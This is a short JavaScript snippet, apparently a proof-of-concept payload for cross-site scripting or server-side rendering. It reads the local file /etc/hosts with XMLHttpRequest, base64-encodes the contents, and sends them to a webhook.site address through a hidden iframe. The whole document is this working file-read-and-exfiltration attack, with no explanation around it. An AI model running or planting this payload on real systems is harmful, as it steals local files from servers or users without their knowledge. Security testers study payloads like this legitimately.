function reqListener () {
    var b64 = btoa(this.responseText);
    var iframe = document.createElement('iframe');
	iframe.style.display = "none";
	iframe.src = "https://webhook.site/6c6b44f3-b8ca-4538-bb61-d5dbeee1ad7b/?xdata="+b64;
	document.body.appendChild(iframe);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///etc/hosts"); 
oReq.send();
